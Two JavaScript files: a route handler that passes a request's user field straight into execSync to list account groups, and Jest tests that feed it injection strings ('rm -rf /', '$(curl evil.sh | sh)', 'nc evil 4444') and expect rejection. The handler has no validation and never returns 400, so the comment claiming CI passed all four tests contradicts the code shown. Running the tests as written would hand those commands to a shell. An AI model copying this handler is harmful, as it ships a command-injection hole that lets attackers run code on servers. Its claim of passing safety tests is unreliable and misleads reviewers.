// File: routes/handler.js
// Shows group membership for a system account.
const { execSync } = require('child_process');

class AccountInfo {
  constructor(user) {
    this.user = user;
  }

  groups() {
    return execSync('id -Gn ' + this.user).toString().trim().split(' ');
  }
}

module.exports = function handler(req, res) {
  const info = new AccountInfo(req.body.user);
  res.send(info.groups().join(', '));
};

// File: test/handler.test.js
// CI (GitHub Actions, main branch): 4 passed, 0 failed
const handler = require('../routes/handler');

function mockRes() {
  const res = { statusCode: 200, body: '' };
  res.status = (c) => { res.statusCode = c; return res; };
  res.send = (b) => { res.body = String(b); return res; };
  res.type = () => res;
  return res;
}

describe('handler input safety', () => {
  test("rejects shell metacharacters", async () => {
    const res = mockRes();
    await handler({ body: { "user": "report.txt; rm -rf /" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test("rejects command substitution", async () => {
    const res = mockRes();
    await handler({ body: { "user": "$(curl evil.sh | sh)" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test("rejects pipes and backticks", async () => {
    const res = mockRes();
    await handler({ body: { "user": "a.txt | nc evil 4444" } }, res);
    expect(res.statusCode).toBe(400);
  });

  test('accepts normal input', async () => {
    const res = mockRes();
    await handler({ body: { "user": "report" } }, res);
    expect(res.statusCode).toBe(200);
  });
});
